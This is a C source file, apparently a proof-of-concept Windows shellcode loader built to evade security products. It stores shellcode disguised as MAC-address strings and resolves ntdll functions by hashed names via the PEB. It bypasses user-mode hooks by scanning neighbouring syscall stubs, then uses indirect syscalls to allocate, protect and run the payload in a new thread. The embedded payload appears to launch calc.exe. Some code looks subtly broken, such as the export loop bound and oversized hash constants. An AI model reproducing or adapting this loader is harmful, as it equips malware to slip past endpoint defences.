#include <Windows.h>
#include <stdio.h>
#include <Rpc.h>
#include <winternl.h>
#include <Ip2string.h>
#pragma comment(lib, "ntdll")

#define NtCurrentProcess()	   ((HANDLE)-1)


#pragma comment(lib, "Rpcrt4.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#define UP -32
#define DOWN 32

EXTERN_C VOID GetSyscall(WORD systemCall);

EXTERN_C NTSTATUS sysZwAllocateVirtualMemory(
    HANDLE    ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

EXTERN_C NTSTATUS sysNtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS sysNtCreateThreadEx(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer
);

EXTERN_C NTSTATUS sysNtWaitForSingleObject(
    IN HANDLE         Handle,
    IN BOOLEAN        Alertable,
    IN PLARGE_INTEGER Timeout
);


struct LDR_MODULE {
    LIST_ENTRY e[3];
    HMODULE base;
    void* entry;
    UINT size;
    UNICODE_STRING dllPath;
    UNICODE_STRING dllname;
};

EXTERN_C VOID GetSyscall(WORD systemCall);
EXTERN_C VOID GetSyscallAddr(INT_PTR syscallAdr);

EXTERN_C NTSTATUS sysNtCreateFile(
    PHANDLE            FileHandle,
    ACCESS_MASK        DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK   IoStatusBlock,
    PLARGE_INTEGER     AllocationSize,
    ULONG              FileAttributes,
    ULONG              ShareAccess,
    ULONG              CreateDisposition,
    ULONG              CreateOptions,
    PVOID              EaBuffer,
    ULONG              EaLength
);



DWORD calcHash(char* data) {
    DWORD hash = 0x99;
    for (int i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

static DWORD calcHashModule(LDR_MODULE* mdll) {
    char name[64];
    size_t i = 0;

    while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) {
        name[i] = (char)mdll->dllname.Buffer[i];
        i++;
    }
    name[i] = 0;
    return calcHash((char*)CharLowerA(name));
}

static HMODULE getModule(DWORD myHash) {
    HMODULE module;
    INT_PTR peb = __readgsqword(0x60);
    auto ldr = 0x18;
    auto flink = 0x10;

    auto Mldr = *(INT_PTR*)(peb + ldr);
    auto M1flink = *(INT_PTR*)(Mldr + flink);
    auto Mdl = (LDR_MODULE*)M1flink;
    do {
        Mdl = (LDR_MODULE*)Mdl->e[0].Flink;
        if (Mdl->base != NULL) {

            if (calcHashModule(Mdl) == myHash) {
                break;
            }
        }
    } while (M1flink != (INT_PTR)Mdl);

    module = (HMODULE)Mdl->base;
    return module;
}

static LPVOID getAPIAddr(HMODULE module, DWORD myHash) {

    PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((LPBYTE)module + DOSheader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)(
        (LPBYTE)module + NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD fAddr = (PDWORD)((LPBYTE)module + EXdir->AddressOfFunctions);
    PDWORD fNames = (PDWORD)((LPBYTE)module + EXdir->AddressOfNames);
    PWORD  fOrdinals = (PWORD)((LPBYTE)module + EXdir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < EXdir->AddressOfFunctions; i++) {
        LPSTR pFuncName = (LPSTR)((LPBYTE)module + fNames[i]);
        if (calcHash(pFuncName) == myHash) {
            return (LPVOID)((LPBYTE)module + fAddr[fOrdinals[i]]);
        }
    }
    return NULL;
}


WORD Unh00ksyscallNum(LPVOID addr) {


    WORD syscall = NULL;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        BYTE high = *((PBYTE)addr + 5);
        BYTE low = *((PBYTE)addr + 4);
        syscall = (high << 8) | low;

        return syscall;

    }

    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
                BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
                syscall = (high << 8) | low - idx;

                return syscall;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
                BYTE high = *((PBYTE)addr + 5 + idx * UP);
                BYTE low = *((PBYTE)addr + 4 + idx * UP);
                syscall = (high << 8) | low + idx;

                return syscall;

            }

        }

    }
}


INT_PTR Unh00ksyscallInstr(LPVOID addr) {


    WORD syscall = NULL;

    if (*((PBYTE)addr) == 0x4c
        && *((PBYTE)addr + 1) == 0x8b
        && *((PBYTE)addr + 2) == 0xd1
        && *((PBYTE)addr + 3) == 0xb8
        && *((PBYTE)addr + 6) == 0x00
        && *((PBYTE)addr + 7) == 0x00) {

        return (INT_PTR)addr + 0x12;    // syscall

    }

    if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 ||
        *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) {

        for (WORD idx = 1; idx <= 500; idx++) {
            if (*((PBYTE)addr + idx * DOWN) == 0x4c
                && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b
                && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1
                && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8
                && *((PBYTE)addr + 6 + idx * DOWN) == 0x00
                && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
                
                return (INT_PTR)addr + 0x12;
            }
            if (*((PBYTE)addr + idx * UP) == 0x4c
                && *((PBYTE)addr + 1 + idx * UP) == 0x8b
                && *((PBYTE)addr + 2 + idx * UP) == 0xd1
                && *((PBYTE)addr + 3 + idx * UP) == 0xb8
                && *((PBYTE)addr + 6 + idx * UP) == 0x00
                && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
                
                return (INT_PTR)addr + 0x12; 

            }

        }

    }

}



int main(int argc, char** argv) {
        
    const char* MAC[] =
    {
        "FC-48-83-E4-F0-E8",
        "C0-00-00-00-41-51",
        "41-50-52-51-56-48",
        "31-D2-65-48-8B-52",
        "60-48-8B-52-18-48",
        "8B-52-20-48-8B-72",
        "50-48-0F-B7-4A-4A",
        "4D-31-C9-48-31-C0",
        "AC-3C-61-7C-02-2C",
        "20-41-C1-C9-0D-41",
        "01-C1-E2-ED-52-41",
        "51-48-8B-52-20-8B",
        "42-3C-48-01-D0-8B",
        "80-88-00-00-00-48",
        "85-C0-74-67-48-01",
        "D0-50-8B-48-18-44",
        "8B-40-20-49-01-D0",
        "E3-56-48-FF-C9-41",
        "8B-34-88-48-01-D6",
        "4D-31-C9-48-31-C0",
        "AC-41-C1-C9-0D-41",
        "01-C1-38-E0-75-F1",
        "4C-03-4C-24-08-45",
        "39-D1-75-D8-58-44",
        "8B-40-24-49-01-D0",
        "66-41-8B-0C-48-44",
        "8B-40-1C-49-01-D0",
        "41-8B-04-88-48-01",
        "D0-41-58-41-58-5E",
        "59-5A-41-58-41-59",
        "41-5A-48-83-EC-20",
        "41-52-FF-E0-58-41",
        "59-5A-48-8B-12-E9",
        "57-FF-FF-FF-5D-48",
        "BA-01-00-00-00-00",
        "00-00-00-48-8D-8D",
        "01-01-00-00-41-BA",
        "31-8B-6F-87-FF-D5",
        "BB-F0-B5-A2-56-41",
        "BA-A6-95-BD-9D-FF",
        "D5-48-83-C4-28-3C",
        "06-7C-0A-80-FB-E0",
        "75-05-BB-47-13-72",
        "6F-6A-00-59-41-89",
        "DA-FF-D5-63-61-6C",
        "63-2E-65-78-65-00",
    };


        PVOID BaseAddress = NULL;
        SIZE_T dwSize = 0x2000;

        LPVOID addr = NULL;
        BYTE high = NULL;
        BYTE low = NULL;
        WORD syscallNum = NULL;
        INT_PTR syscallAddr = NULL;

        int rowLen = sizeof(MAC) / sizeof(MAC[0]);
        PCSTR Terminator = NULL;
        NTSTATUS STATUS;
        

        HMODULE mod = getModule(4097367);	// Hash of ntdll.dll
        
        //python GetHash.py ZwAllocateVirtualMemory
        addr = getAPIAddr(mod, 18887768681269);	// Hash of ZwAllocateVirtualMemory

        syscallNum = Unh00ksyscallNum(addr);
        syscallAddr = Unh00ksyscallInstr(addr);

        GetSyscall(syscallNum);
        GetSyscallAddr(syscallAddr);
        NTSTATUS status1 = sysZwAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(status1)) {
            return 1;
        }
        printf("[+] sysZwAllocateVirtualMemory executed !!\n");


        DWORD_PTR ptr = (DWORD_PTR)BaseAddress;
        for (int i = 0; i < rowLen; i++) {
            STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
            if (!NT_SUCCESS(STATUS)) {
                return FALSE;
            }
            ptr += 6;

        }

        HANDLE hThread;
        DWORD OldProtect = 0;

        addr = getAPIAddr(mod, 6180333595348);


        syscallNum = Unh00ksyscallNum(addr);
        syscallAddr = Unh00ksyscallInstr(addr);

        GetSyscall(syscallNum);
        GetSyscallAddr(syscallAddr);
        NTSTATUS NtProtectStatus1 = sysNtProtectVirtualMemory(NtCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
        if (!NT_SUCCESS(NtProtectStatus1)) {
            return 2;
        }
        printf("[+] sysNtProtectVirtualMemory executed !!\n");

         
        HANDLE hHostThread = INVALID_HANDLE_VALUE;

        //python GetHash.py NtCreateThreadEx
        addr = getAPIAddr(mod, 8454456120);	// Hash of NtCreateThreadEx

        syscallNum = Unh00ksyscallNum(addr);
        syscallAddr = Unh00ksyscallInstr(addr);

        GetSyscall(syscallNum);
        GetSyscallAddr(syscallAddr);
        NTSTATUS NtCreateThreadstatus = sysNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
        if (!NT_SUCCESS(NtCreateThreadstatus)) {
            printf("[!] Failed in sysNtCreateThreadEx (%u)\n", GetLastError());
            return 3;
        }
        printf("[+] sysNtCreateThreadEx executed !!\n");


        LARGE_INTEGER Timeout;
        Timeout.QuadPart = -10000000;

        //python GetHash.py NtWaitForSingleObject
        addr = getAPIAddr(mod, 2060238558140);	// Hash of NtWaitForSingleObject

        syscallNum = Unh00ksyscallNum(addr);
        syscallAddr = Unh00ksyscallInstr(addr);

        GetSyscall(syscallNum);
        GetSyscallAddr(syscallAddr);
        NTSTATUS NTWFSOstatus = sysNtWaitForSingleObject(hHostThread, FALSE, &Timeout);
        if (!NT_SUCCESS(NTWFSOstatus)) {
            printf("[!] Failed in sysNtWaitForSingleObject (%u)\n", GetLastError());
            return 4;
        }
        printf("[+] sysNtWaitForSingleObject executed !!\n");

        printf("[+] Finished !!!\n");

        return 0;
}